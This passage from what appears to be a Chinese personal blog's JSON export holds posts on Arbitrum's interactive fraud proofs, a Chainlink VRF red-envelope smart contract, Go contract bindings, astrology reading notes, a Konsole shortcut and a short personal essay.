arbitrum（2）","slug":"以太坊Rollup方案之-arbitrum（2）","date":"2024-09-21T06:36:46.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2024/09/21/以太坊Rollup方案之-arbitrum（2）/","permalink":"https://bighu630.github.io/2024/09/21/%E4%BB%A5%E5%A4%AA%E5%9D%8ARollup%E6%96%B9%E6%A1%88%E4%B9%8B-arbitrum%EF%BC%882%EF%BC%89/","excerpt":"","text":"上一期简单介绍了一下rollup的一些基本内容以及aritrun交易的执行流程，这一期将介绍一下aritrum的核心技术 – 交互式单步证明 这一期主要涉及到的是arbitrum的验证节点 arbitrum 架构 validator（验证节点）的功能有两个 通过质押资产出L2的rblock 向不合法的区块发送单步证明 一个arbitrum的验证节点可以概括为以下几个部分 Rpc server : 提供arbtirum rpc服务（以太坊rpc的超集） Geth：执行层 AVM ：验证层（验证过程是把evm操作码转译为avm） Rpc模块用于接受以太坊格式的请求（用户体验上L2与L1的区别仅在与L2手续费低很多，几乎没有多于的配置） Geth模块是L1的执行层，用于执行L1操作码 AVM模块是L2的验证层，用于验证L2操作码,并不是每一笔交易都会走到验证层，就现实而言arbitrum已经运行一年多了，还没有走到验证层的交易 当然没有走到验证层并不是说验证层没用，而是目前没有好的办法绕过验证层的验证，或者是使验证层出错（毕竟在区块链系统，出错一般是恶意的） AVM 状态机VM状态不外乎这几种：特殊状态Halted（暂停），特殊状态ErrorStop，或其他扩展状态。 扩展状态包含下列几种： Current Codepoint，当前码点：代表当前运行所处的码点 Data Stack，数据栈：该栈是运算的首要工作区 Aux Stack，辅助栈：该栈提供了辅助的存储空间 Register，寄存器：一种可变的存储单元，可存储单个值 Static，静态：一种在VM初始化时就已经确定的不可变值 AVMGas Remaining，AVMGas剩余: 记载了在出现报错前可消耗多少AVMGas的一个整形 Error Codepoint，错误码点: Error所对应的码点 Pending Message，待处理消息: 记录了待处理的收件箱信息（若有的话）的元组 当VM初始化时，位于扩展状态。Data Stack, Aux Stack, Register, AVMGas Remaining, 和 Error Codepoint 会分别初始化为 None, None, None, MaxUint256, 和Codepoint (0, 0)。创建VM的实体提供Current Codepoint和Static的值。 vm的最终状态为上述状态的串联hash AVM操作码案例 Opcode NickName 描述 0x01 add 从数据堆栈中弹出两个值（A、B）。 如果 A 和 B 都是整数，则将值 A+B（截断为 256 位）压入数据堆栈。 否则，引发错误。 0x70 send 从数据堆栈中弹出两个值（A、B）。 如果 A 和 B 都是整数，则将值 A+B（截断为 256 位）压入数据堆栈。 否则，引发错误。 0x72 inbox 如果待处理消息不是空元组，则将待处理消息推送到数据堆栈上，然后将待处理消息设置为等于空元组。 否则，将阻塞直到虚拟机的收件箱序列非空。 然后从运行时环境提供的收件箱序列中删除第一项，并将结果推送到数据堆栈上。 AVM 数据结构案例codepoint表示当前执行的指令。arbitrum中在某个PC值下指令的码点是（opcode at PC, Hash(CodePoint at PC+1)）。如果没有CodePoint at PC+1，则使用0。 Data Stack表示存储的数据栈。当执行到某个指令码是会根据指令码的逻辑在数据栈中取出或压入指定数量的数据。数据栈也使用类似的链式结构。 注：codepoint是链式结构，执行过程不会改变，data stack满足栈的操作逻辑。 交互式证明分割协议（简化版） Alice为自己的主张辩护，她的主张是：从父区块的状态开始，虚拟机的状态可以前进至她所主张的区块A上的状态。本质上，她是在宣称，虚拟机可以执行N条指令，消耗M条收件箱中的信息并将哈希从H’转换为H。 Alice的第一个动作需要她把她的断言从开始（0条指令已执行）到结束（N条指令已执行）以中间点切分。协议要求Alice将其主张对半切分，发布中间点在执行了N&#x2F;2步指令后的的状态。 当Alice已经有效地将她的断言二等分变为两个N&#x2F;2步的断言后，Bob需要在这两个片段中选择一段并声明它是错的。 在此，我们又回到了之前的状态：Alice主张一个断言，Bob不同意。不过现在我们已经把断言长度从N缩短到了N&#x2F;2。我们可以再重复之前的动作，Alice二分，Bob选择不同意的那一半，缩短尺度到N&#x2F;4。我们可以继续该动作，经过对数轮的博弈，Alice和Bob的争议点就缩减为了单步操作。自此，分割协议就终止了，Alice必须给EthBridge生成一个单步证明供其检测。 A作为出快人，c作为挑战者 A主张L2状态机在H0状态下经历N个操作码之后到达Hn状态 （H0,Hn表示上面提到的vm的最终状态） C主张H0在经历N个操作之后不会变成Hn A对N步操作进行二分 表明H0在经过N&#x2F;2个操作后变成H(n&#x2F;2) 注意这里暗示了H(n&#x2F;2)经历剩下N&#x2F;2个操作之后会变成Hn,C需要指出两段之中的一段的错误 C表示H0经过N&#x2F;2个操作之后不会变成H(n&#x2F;2) A表示H0经过N&#x2F;4个操作之后变成H(n&#x2F;4) C表示从H(N&#x2F;4)经历N&#x2F;4个操作之后不会变成H(n&#x2F;4)... 表示层Hi 经历一个操作之后不会变成H(i+1) A 提交Hi状态下的世界信息（也就是上面提到的那些堆栈，codepioint的那些信息，但是不是所有的，比如Add操作码只有两个操作数，那么数据堆栈就只需要两个，由于整个堆栈是可hash,所以A无法作恶） 代码上的流程图表现为这样 单步证明初始状态下AVM状态相同,如下： 执行一步后状态不同 验证者从链上获取对方的信息得知，对方在执行add前与本地状态相同，执行后状态不同 验证者将执行前状态，其他各个没有改变的栈的状态hash，add指令的codepoint,数据栈的 前两个元素，执行add后状态提交在链上。（执行前后的状态用于保证这一步确实是有问题的，并且暗示验证者同意执行前的状态，上传没有改变的栈是因为后面计算最终状态时要用）。 链上执行add操作后宣布验证结果","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"二层","slug":"区块链/二层","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BA%8C%E5%B1%82/"}],"tags":[{"name":"以太坊","slug":"以太坊","permalink":"https://bighu630.github.io/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"},{"name":"arbitrum","slug":"arbitrum","permalink":"https://bighu630.github.io/tags/arbitrum/"}],"author":"ivhu"},{"title":"当代占星研究-1","slug":"当代占星研究-1","date":"2024-09-21T05:36:42.000Z","updated":"2026-02-27T03:14:28.901Z","comments":true,"path":"2024/09/21/当代占星研究-1/","permalink":"https://bighu630.github.io/2024/09/21/%E5%BD%93%E4%BB%A3%E5%8D%A0%E6%98%9F%E7%A0%94%E7%A9%B6-1/","excerpt":"","text":"七个宇宙法则 唯心法则 ：一切万有（All That Is）唯心所造 这里有一个翻译上的彩蛋（非常感谢作者保留了原来的含义）all是一切，that is 是万有，all没什么好说的，that is 是一个比较有意思的东西，因为他缺乏宾语，我们暂时不引用书中的上主。在that is中实际上就包含着唯心所造，直译就是 一切 所“是” 都是心的“是”，all that is are your is。我们把is 当做一个名词（或许用are这个复数不是很合适，属于是自己diy英语） 上下一致法则：物质次元发生的事源头是心智次元 首先要知道上下是什么，这里的上指的是你的心理，下指的是你的表现形式，也就是你心理怎么想的你就会怎么做（占星的关键是你会这么想）。这里需要区别于王阳明的知行合一，知行合一是一种“想”。 能量振动法则：万物都是在运动的，人不可能两次踏入同一条河流 所有的东西都是在变动中的，占星不是一个静态的分析过程，恰恰他是对动态的分析，他是一系列动作，而不是一个结果。l 二元法则：对立面的永恒存在 这是一个很有意思的观点，有意思的关键是无聊，喜欢的关键是厌倦，在这儿的关键是不在那儿。有点抽象，但是恰恰就是因为反面存在，我们才知道我们在正面，因为天会黑，所以天会亮。 周期循环：事务有周期性的规律 就像三十年河东三十年河西一样，不会一直是一边吃香，但是占星学的周期不是你现在没钱，你以后就有钱，占星的关键是你在什么样的周期里，实际上钱这个话题也只是某个周期，注意重要的不是你想要什么样的周期，而是周期来了你知道 is yours.（有点形而上的感觉） 因果关系： 事出有因，又因必有果 很喜欢这一段，因为它扯到了“业力”这个词，非常恰当，感觉这段都不要解释了 业力：我们需要做出这么一点假设，也就是轮回，你可以不相信轮回，在最后我会尝试把轮回替换成一个你能接受的词，用轮回可以使佛教的理论闭合。 为什么会轮回，因为你有业力促使你不得不投胎回来，如你死不瞑目，刚想孝顺父母，自己先倒了。你倒了什么都不会发生（我不是很喜欢那些死了之后怎么怎么地的话），但是恰恰是你死了什么都没有（什么都做不了），所以才有业力，这业力就是你死不瞑目的东西，就这么说，如果你死不瞑目，你就一定会投胎，在无限的时间里（实际上死了就没有时间的说法）这是你唯一能做的（对比天伦之乐，指了却身前身后事，你不需要轮回，你没有轮回的想法），你收业力推动来到新一世，但是你看不到前一世的因果，而业力推动你做你该做的。 那么业力为什么可以推动你做什么呢？ 这就是佛教的另一个话题 – 缘。业力推动缘分，缘分及是你投胎的目的（化缘），风吹幡动，是心动。缘起性空。这里不展开解释了。 那么我们来替换掉轮回—- 有这么一个故事，有一个，小时候看到有厨子炒菜，他想要做个厨子，后来他成为厨子了。 为什么小时候这么多事情，他偏偏看上厨子。（这是很形而上的理论） 这能说明他的业力吗？如果硬说不能也可以，但是业力的定义就是这个，业力促使他想要成为厨子（业力就是一种形而上） 占星学要做的就是找到你的因果（找到你心动的点）。 阴阳法则：向内求所&amp;向外求所 阴阳象征着两种趋势，向内&amp;向外(懒得写了） 占星的起点你所站的位置就是星宫的起点，上方代表白昼，下方代表夜晚 占星学本身是研究上下一致性法则的学问 上下一致性，也就是都是内心安排好了的，如果配合一点佛教的业力会更好理解一点，占星的本质是找到 上 → 投射出下，找到你的内心，投射出你的行动。 随地大小记：巨蟹座与家庭和食物有关 key word元素，星座，行星，宫位，相位 元素 火：代表让事情发生的驱动力 土：使内在驱动力变为现实 风：沟通 水：情感连结的驱动力 火象星座：牡牛座，狮子座，射手座 火的目的是带领，启发，赋予。火系星座倾向与理性主义，不容易出现稳定，平衡，敏感，同理心，细腻这些特质（当然还会有其他的可能性，比如受水星影响） 牡牛座：拓荒者，为目标奋斗的人 狮子座：启发别人 射手座：追寻意义 火象的过度会导致周围的人很痛苦，且本人也可能活在一种虚伪之中。 土象星座：金牛座，处女座，摩羯座 土象星座更注重现实，他们更趋于稳定，平衡。他们需要基本的物质保障（不想火象，火象所需要的物质保障要求太高，所以很早就会放弃，）这也是土象星座的现实主义体现，他们需要做够维护他们长期发展的土壤，不能接受有上顿没下顿。 金牛和摩羯： 希望产出具体的东西，能被量化的东西 处女座：变动星座，切收水星影响较大，处女座往往需要更多的安全感，这样才能让ta生根发芽。 土象过度会导致追求物质，没有安全感，不愿意冒险，传统&amp;保守 风象星座：双子座，天秤座，宝瓶座 风象星座是最懂交流沟通的星座，他们知道如何把合适的信息传递给合适的人，他们往往更加理性，更少的将感性注入到信息中，这是消息能准确的根本。也是风象星座能在社交中如鱼得水的原因。 风象的过度会导致人过度的理性，而失去是世界而平衡（建筑平衡是土象星座擅长的） 水象星座：巨蟹座，天蝎座，双鱼座 水象星座表现为内向低调，他们更强调精神的安全感（土象更强调物质的安全感）水象人与火象人相反，他们更加敏感细腻。他们看上去表面平静，实际上内心是波涛汹涌。容易受环境的影响，同时也更能适应环境 巨蟹座：关注家庭提供的归属感 天蝎座：需要在亲密关系中找到安全感 双鱼座：希望在天人合一中找到安全感（也就敏感的人能找到天人和一） 水象元素的过度会导致人迷失自我，过于细致的同感 导致迷失自己真实的感觉。执着，依赖，不理性，喜欢控制 容易产生逃避依恋人格。 元素的组合了解了每个元素之后，就比较容易理解各种元素的组合会是什么情况。 火与土的组合可能缺乏细腻的觉知，但会显现出强大的动力，成为一个不畏艰险，能够将事情落实的理想主义者。 火与风的组合往往是怀抱着伟大理论的理想主义者。 火与水的组合则是真正具有创造力的人，不过情绪起伏很大。 土与水的组合会带来滋养的能力和负责的态度，十分关切自己和他人的安全保障。 土和风的组合带来的是枯燥和实际的特质，不过也有实事求是的智慧和幽默感。 风与水的组合则会特别重视关系，对人性了如指掌。 缺乏元素注意这里的缺乏不是完全没有，而是在星象中很少有这些元素的体现。且缺乏元素往往会以相反的方式体现出来，如火元素代表的是直觉力，因此缺乏火元素的人可能带有负向的直觉。换句话说，他们总是预期不好的事会发生在自己身上，但缺乏火元素却有利于撰写犯罪或恐怖小说。 没有行星落在火元素上 缺少火元素表现为缺乏动力，活力。在人生轨迹上缺乏信赖感和自信心。他们更习惯相信：事情终究会没问题（这是一种消极的信心，表示对自己对自己所能掌控的一切的不自信，渴望事情能通过事情本身而被解决，自己一点手也插不上）。缺乏火元素的人可能更加热爱心理学，占星，算命这类（因为他们不习惯掌控自己的命运）。令：缺乏火元素的人一般不易“放下”，可能会被自己认定的事情蒙蔽双眼。 没有行星落在土元素上 缺乏土元素将导致不容易和金钱发生连接，也就是不明白钱是什么玩意儿。如对物价不敏感，对性价比不敏感，他们可能更在乎他们想要卖什么，而不在乎这东西值不值这个价。缺乏土元素可能更适合理财（如果他们意识到是要通过100块买110块的话，对金钱的不敏感可以使得他们在金融中找到更深层次的逻辑）。另外土元素缺乏可能对大自然有一种幼稚的情结，如热衷于穿着裸露，曲线毕露的模特。缺乏土元素的人适合通过 瑜伽，按摩，园艺，运动等方式来缓解。 土元素缺乏可能导致疑心病，上瘾症，不懂知足 没有行星落在风元素上 缺乏风元素一般表现为意识不到自己或他的的行动的意义，难以看清大局。缺乏风元素可能导致难以和他人做成合作关系。不能客观的看待自己的问题，容易沉浸在自己的痛苦之中。在沟通和学习的过程中比较缺乏信心，容易被他人的意见影响。缺乏风元素的人喜欢地图以及其他能提供方向的事务，同样也喜欢占星学。 没有行星落在水元素上 没有行星落在水元素上并不是说没有感性，而是处理不了感性，缺乏水元素的人可能部分消化自己的生命情感。在交友上可能无法与他人形成情感上的连接。他们会认为情感是一个令人痛苦的东西，容易通过自闭的方式压抑情感。他们容易在小时候遭受情感创伤（因为无法处理情感上的事情，而一直走不出来）。这类人容易深陷感情之中，无法自拔，也可能会变得极具情绪化。即要么无法控制情绪的表达，一直多愁善感。要么表现为无法和情绪连接，变成一个不会笑不会哭的人。缺少水元素的人可以通过音乐，艺术之类的东西上引导消化混乱的情绪。 行星性质的三分法","categories":[{"name":"图书","slug":"图书","permalink":"https://bighu630.github.io/categories/%E5%9B%BE%E4%B9%A6/"},{"name":"当代占星研究","slug":"图书/当代占星研究","permalink":"https://bighu630.github.io/categories/%E5%9B%BE%E4%B9%A6/%E5%BD%93%E4%BB%A3%E5%8D%A0%E6%98%9F%E7%A0%94%E7%A9%B6/"}],"tags":[{"name":"占星","slug":"占星","permalink":"https://bighu630.github.io/tags/%E5%8D%A0%E6%98%9F/"}],"author":"ivhu"},{"title":"ios翻墙教程","slug":"ios翻墙教程","date":"2024-09-21T04:32:26.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/09/21/ios翻墙教程/","permalink":"https://bighu630.github.io/2024/09/21/ios%E7%BF%BB%E5%A2%99%E6%95%99%E7%A8%8B/","excerpt":"","text":"由于手上没有ios的设备，可以看这个文章：https://laob.me/2300/","categories":[{"name":"教程","slug":"教程","permalink":"https://bighu630.github.io/categories/%E6%95%99%E7%A8%8B/"},{"name":"科学上网","slug":"教程/科学上网","permalink":"https://bighu630.github.io/categories/%E6%95%99%E7%A8%8B/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"}],"tags":[{"name":"教程","slug":"教程","permalink":"https://bighu630.github.io/tags/%E6%95%99%E7%A8%8B/"},{"name":"科学上网","slug":"科学上网","permalink":"https://bighu630.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"}],"author":"ivhu"},{"title":"chainLink vrf实验","slug":"chainLink-vrf实验","date":"2024-09-13T06:00:42.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/09/13/chainLink-vrf实验/","permalink":"https://bighu630.github.io/2024/09/13/chainLink-vrf%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"这篇博客讲述了如何在Solidity中使用VRF编写一个可以生成随机红包的智能合约，详细介绍了红包的核心数据结构、创建红包的流程、如何通过VRF生成随机数来分配红包金额，以及如何使用Chainlink VRF完成随机数订阅和获取，最后通过部署在测试网络上的合约进行验证。 目标用vrf写一个随机红包 数据结构红包： struct Envelope { Type t; // 类型，只是erc20 和eth红包 ERC20 token; // erc20 ,如果是erc20红包，这里是erc2o的地址 address sender; // 发红包的sender uint balance; // 金额 bool allowAll; // 允许所有人领取 uint32 maxReceiver; // 最大领取数，eg：最多3个人领取红包 bool avg; // 平均主义，每个红包的价值等于balance/maxReceiver //填false则使用随机红包 uint avgMonty; // 平均金额 uint timeOutBlocks; //超时可以回收红包 ,也可以打开未领取完的红包 address[] received; // 已经领取过的列表 } 每个红包中储存红包的信息,可以在允许过程中发送红包 **存储数据: ** mapping(bytes32 =&gt; Envelope) public envelopes; // 红包hash -&gt; 红包内容，领取红包时需要提供红包hash mapping(bytes32 =&gt; mapping(address =&gt; bool)) public addressAllowList; // 红包对应的 allowlist 这个放在红包外面存是因为struct里面不能放map mapping(bytes32 =&gt; mapping(address =&gt; bool)) addressGotList; // 已经领取的列表,与received有点重复，建议将received修改为一个int,记录有多少人领过 mapping(uint =&gt; bytes32) openWithVRF; // 红包对应的vrf, 当红包是随即红包时会用到这个 mapping(ERC20 =&gt; uint) ERC20Balance; // 每个erc20对应的金额，合约自己可以通过看自己的eth余额来判断，erc20需要单独记录，应为可以同时存在多个合约，如果多个合约都是同一个erc20,需要判断erc20的approve是否足够 mapping(bytes32 =&gt; uint[]) VRFKey; // vrf 对应的随机数列表 // VRFV2PlusClient public COORDINATOR; bytes32 keyHash = 0x787d74caea10b2b357790d5b5247c2f63d1d91572a9846f780606e4d953677ae; // VRF 用到的key,可以去官方文档查 uint256 s_subscriptionId; // vrf 用到的另一个key uint32 immutable callbackGasLimit = 100000; // 官方推荐配置 // The default is 3, but you can set this higher. uint16 immutable requestConfirmations = 3; //官方推荐配置 上面的mapping 主要是红包合约的配置下方的数据则是chainlink vrf的配置，这些key可以去官网查看具体的含义 合约的初始化 constructor( uint256 _subscriptionId, address _coordinator ) VRFConsumerBaseV2Plus(_coordinator){ s_subscriptionId = _subscriptionId; } 初始化主要是赋值vrf的订阅id（后续具体操作有详细过程） 构建红包 function createETHredEnvelope( bool allowAll, address[] memory allowList, uint32 maxReceiver, bool avg, uint timeOutBlocks ) public payable returns (bytes32) {} allowAll：运行所有人领取，如果是true那么任何人都可以根据红包hash调用get方法领取红包 allowList：如果allowAll,那么allowList无用 maxReceiver：最大领取数，最大领取数可以比allowList小，这样代表有人领不到红包 avg： 是否平均，如果平均那么每个人领取到的金额 &#x3D; msg.value&#x2F;maxReceiver timeOutBlocks：经过多少各block后超时，超时之后红包的发起人可以回收红包余额，或者打开红包 function createERC20redEnvelope( address token, uint size, // erc20的数量 bool allowAll, address[] memory allowList, uint32 maxReceiver, bool avg, uint timeOutBlocks ) public returns (bytes32) {} createERC20redEnvelope 与createETHredEnvelope 的区别只是使用的是erc20 函数内的区别在与erc20要校验有没有足够的apporve uint approved = ERC20(token).allowance(msg.sender,address(this)); require(approved&gt;=ERC20Balance[ERC20(token)]+size); ERC20Balance[ERC20(token)] += size; 添加AllowList function allowSome(bytes32 hash, address[] memory allowList) public { require(envelopes[hash].balance != 0, &quot;envelop balance is 0&quot;); require(envelopes[hash].sender == msg.sender,&quot;only envelops sender can do this&quot;); for (uint i = 0; i &lt; allowList.length; i++) { addressAllowList[hash][allowList[i]] = true; } } 这就不多解释了 领取红包 function get(bytes32 hash) public {} 领红包的方法签名很简单，只需要传一个红包hash就可以，但内部逻辑很复杂，重点看一下它里面的判断 require(envelopes[hash].balance != 0, &quot;envelop balance is 0&quot;); // 判读红包余额不为0 require(!addressGotList[hash][msg.sender], &quot;has got&quot;); // 判断发起人是否已经领取过 require( // 判断红包是否已经超时 envelopes[hash].timeOutBlocks &gt; block.number, &quot;envelop timeOutBlocks is not enough&quot; ); require( addressAllowList[hash][msg.sender] || envelopes[hash].allowAll,// 判断发起人是否被允许 &quot;not allow&quot; ); require(envelopes[hash].received.length &lt; envelopes[hash].maxReceiver, &quot;no more&quot;); // 还是判断是否已经领取完 在领取上有两种逻辑，一种是平均红包，平均红包get后会马上到账。一种是随机数红包，随机数红包不会立马到账需要等领红包的人数达到maxReceiver 或者红包超时，后面会详细讲怎么领随机数红包。 打开随机数红包 function openEnvelopes(bytes32 hash)public{ require( envelopes[hash].timeOutBlocks &lt; block.number || envelopes[hash].received.length == envelopes[hash].maxReceiver, &quot;envelop timeOutBlocks is not enough&quot; ); require(envelopes[hash].maxReceiver &gt; 0,&quot;max receriver max more than 0&quot;); 打开随机数红包一般是在领取时自动调用，如果领取人没有达到maxReciver,可以在红包超时后手动调用。 这个方法中会向vrf请求一个随机数，正常情况chainlink会调用fulfillRandomWords方法来返回随机数。 function fulfillRandomWords( uint256 requestId, uint256[] calldata randomWords ) internal override { require(randomWords.length == envelopes[openWithVRF[requestId]].received.length); VRFKey[openWithVRF[requestId]] = randomWords; } 实际上可以在这个方法里面写红包分发的内容，但是由于这一步是chainlink触发的是由他来执行手续费，所以这里面逻辑不能太复杂（实际上限制的参数就是keyHash 这个变量） 手动打开红包由于chainlink返回的时候不能有复杂的逻辑，所以随机数红包只能由手动触发 function openVRFEnvelop(bytes32 hash)public { uint[] memory randomWords = VRFKey[hash]; require(envelopes[hash].maxReceiver &gt; 0,&quot;max receriver max more than 0&quot;); require(randomWords.length!=0,&quot;can not get vrf words&quot;); uint16[] memory words = new uint16[](randomWords.length); // 计算每一个小分段的权重 } vrf订阅id获取首先我们需要去chainlink上领取一点测试币（link币和eth币，两个都要，如有已经有了可以跳过） 网址： https://faucets.chain.link/ 然后需要去crf管理页面构建一个钱包合约，后面请求vrf随机数时会扣除Link币 网址：https://vrf.chain.link/ 填完信息后，还是这样网址，下面会出现你的sub 点击你的sub,里面有sub的id，这个id就是合约部署时要用到的id，可以用这个id先把合约部署上去，后面要合约的地址 在这个页面的右下角找到fund 给这个sub冲点link币 冲完之后点左边的add cousumer ，把你的合约地址填进来 至此，这个红包合约就可以用了 测试这个红包我已经部署在测试网络上了，可以直接去上面试试 https://sepolia.etherscan.io/address/0xc81c0913e6365eb31e761d1062b41dd5a96d2e90#writeContract 合约源码后续会贴在这里（今天网太卡了，我环境一直下载不下来） 源码地址：(这两天环境弄好了我会把代码放上去，目前还是一个空项目) https://github.com/bighu630/redEnvelop","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"二层","slug":"区块链/二层","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BA%8C%E5%B1%82/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://bighu630.github.io/tags/solidity/"},{"name":"vrf","slug":"vrf","permalink":"https://bighu630.github.io/tags/vrf/"}],"author":"ivhu"},{"title":"who is the bighu","slug":"who-is-the-bighu","date":"2024-09-12T13:06:45.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2024/09/12/who-is-the-bighu/","permalink":"https://bighu630.github.io/2024/09/12/who-is-the-bighu/","excerpt":"","text":"bighu 是一个虚构的身份，用于为不成熟的自我构建一个成熟的自我，后来用来补全我所不知道的自我，再后来变成一个标签，而丧失bighu原有的内涵。 谁是bighu？说来bighu这个名字源与一个影视作品，《穹顶之下》里面的一个有点反派味道的Big Jim。有中镇长的味道。当然bighu和这部电影关系不大，只是顺便用了这个名字 bighu其实在我看一些哲学书籍之前就存在，它的存在有一定的中二属性，也就是虚拟身份，就像是作家的笔名，bighu是我以我为笔时的笔名（省略一段意味深长，又点带鸡汤的话）。 借用一点存在主义的概念，人是人所不是，人总是在“去成为什么”，而不是“是什么”, to be or not to be 的问题,bighu 不是我，但bighu与我有一种 “去成为”的关系。 那么bighu是一种理想主义吗？ 或许曾经可能是，但是理想的理想主义应该是能接受不理想的这种指涉循环使得bighu不是一种理想主义，bighu不代表我对理想的理解，甚至bighu可能代表我对不理想的理解，我也不知道，总之bighu逐渐变得消极（或者是我逐渐远离bighu） 对理想的追求&#x3D;追求不理想 我是bighu吗？我想是的，我即是bighu， 但是我可以不是bighu bighu(我)真的存在吗？我思故我在，如果有一天我放弃了上面说的那些东西,bighu就不在了，我也不再思了. bighu 是一个假想的对象吗(for一些心理需求)这个问题很蠢，下一个(实际上是上一个，为了不打断阅读体验，这种有点蠢的问题放在最后面,但是很早就想到了)蠢的原因是 问这个问题的人像是没看懂上面的 bighu是我以我为笔时的笔名 for bighu","categories":[{"name":"随笔","slug":"随笔","permalink":"https://bighu630.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"沉思录","slug":"沉思录","permalink":"https://bighu630.github.io/tags/%E6%B2%89%E6%80%9D%E5%BD%95/"}],"author":"ivhu"},{"title":"konsole奇怪的command bar","slug":"konsole奇怪的command-bar","date":"2024-09-11T09:22:58.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/09/11/konsole奇怪的command-bar/","permalink":"https://bighu630.github.io/2024/09/11/konsole%E5%A5%87%E6%80%AA%E7%9A%84command-bar/","excerpt":"","text":"在这篇博客中，作者分享了在使用Konsole时意外触发命令栏的经历，虽然发现了一个潜在有用的功能，但由于该功能的快捷键与Vim用户常用的 esc 键冲突，导致了一些操作上的困扰。作者通过探索发现这是SSH管理器的快捷键，但Konsole的配置中并未明确指出此快捷键的冲突来源，给用户带来了一定的不便。 WTF今天以打开konsole就发生了一件让我“高兴”的事情，我在无意间打开了konsole的一个command bar！！！ 我寻思这功能挺好的，虽然我还不知道怎么触发，但是可以后面在研究嘛。 然后我就开始了罪恶之旅，这个功能的触发键是esc ，我一老年vim用户，你把esc 抢走了这让我怎么活 又折腾半天，终于我明白了，这是ssh的快捷键 关键是这个快捷键居然不再konsole的配置里面，如果我在配置里面也配一个esc,它只会告诉我快捷键冲突，不会说是那个快捷键冲突，感觉是konsole的设计问题，最好是放一起，这还好我ssh里面有点东西，要没东西我估计我永原不知道 ssh管理器里面还有个快捷键","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"linux","slug":"计算机/linux","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/linux/"}],"tags":[{"name":"kde","slug":"kde","permalink":"https://bighu630.github.io/tags/kde/"},{"name":"konsole","slug":"konsole","permalink":"https://bighu630.github.io/tags/konsole/"}],"author":"ivhu"},{"title":"区块链应用与以太坊的交互","slug":"区块链应用与以太坊的交互","date":"2024-09-11T07:52:13.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2024/09/11/区块链应用与以太坊的交互/","permalink":"https://bighu630.github.io/2024/09/11/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%94%E7%94%A8%E4%B8%8E%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%9A%84%E4%BA%A4%E4%BA%92/","excerpt":"","text":"这篇文章深入探讨了以太坊的交互机制，强调通过以太坊支持的工具链实现链上合约与链下应用（如Chainlink和Arbitrum）的有效交互，特别是在合约调用、事件监控及交易构造等方面的具体实现和注意事项。 我们要谈的交互首先要明确一点，以太坊是一个去中心化的平台，他不可能为了某个项目而新增交互接口。我这里说的交互是指应用是链上合约的交互，更明确的说，是chainlink,arbitrum,cosmos这些链下应用与链上合约的交互。所以这里我不是想说以下交互方式： 通过钱包交互：将应用打包成一个网页，连接类似与小狐狸 这样的钱包，与链发生交互。 手动构造交易：构建交易tx并使用私钥对交易进行签名，然后直接发送到链给定的接口上。 对于一些简单的调用，通过上面两种方式是可行的，例如我们只是做一些nft的构造，通过钱包是最合适的。但是对于向arbitrum这类链上的应用，如果要做一个交互式单步证明，在这个过程中我需要监控链上合约抛出的event,分析event并构造出相应结果。这个时候钱包就很难插手，而如果主动构造交易并签名，那么过程太繁琐。实际上以太坊上已经提供了相关的工具链。 我们要谈的交互方式就是，通过以太坊支持的工具链实现与以太坊的交互 工具链 简单而言是使用以太坊工具将sol的合约代码转换成go的类文件，并对调用细节进行封装。而在应用层（arbitrum,chainlink这一层）可以直接将对应参数传过去就可以. 以arbitrum为例: 生成go代码生成工具在： https://github.com/OffchainLabs/nitro/blob/master/solgen/gen.go由于arbitrum用到链makefile,所我们没法通过运行这个文件（go run gen.go）的方式,去生成合约文件。不过实际上这是一个路径的问题，在代码的第71行： filePaths, err := filepath.Glob(filepath.Join(parent, &quot;contracts&quot;, &quot;build&quot;, &quot;contracts&quot;, &quot;src&quot;, &quot;*&quot;, &quot;*.sol&quot;, &quot;*.json&quot;)) if err != nil { log.Fatal(err) } filePathsSafeSmartAccount, err := filepath.Glob(filepath.Join(parent, &quot;safe-smart-account&quot;, &quot;build&quot;, &quot;artifacts&quot;, &quot;contracts&quot;, &quot;*&quot;, &quot;*.sol&quot;, &quot;*.json&quot;)) if err != nil { log.Fatal(err) } filePathsSafeSmartAccountOuter, err := filepath.Glob(filepath.Join(parent, &quot;safe-smart-account&quot;, &quot;build&quot;, &quot;artifacts&quot;, &quot;contracts&quot;, &quot;*.sol&quot;, &quot;*.json&quot;)) if err != nil { log.Fatal(err) } 这里实际上就指定了合约代码的路径，当然如果只是初次下载合约文件应该是看不到build目录的，需要在合约所在项目构建一下，才能生成这个build文件 构造方法： yarn --cwd contracts build yarn --cwd contracts build:forge:yul # 其实就是hardhat compile的产物 然后就会在solgen这个目录下生成对应的go文件 我们具体看一下这个生成的代码怎么用 使用生成的代码首先可以看到在生成的代码中，每一个合约都有一个对应的类eg： // ChallengeLibTransactorRaw is an auto generated low-level write-only Go binding around an Ethereum contract. type ChallengeLibTransactorRaw struct { Contract *ChallengeLibTransactor // Generic write-only contract binding to access the raw methods on } 合约中的方法则对应到类的方法 eg: // Solidity: function oneStepProveExecution(uint64 challengeIndex, (uint256,uint256,bytes32[],uint256) selection, bytes proof) returns() func (_ChallengeManager 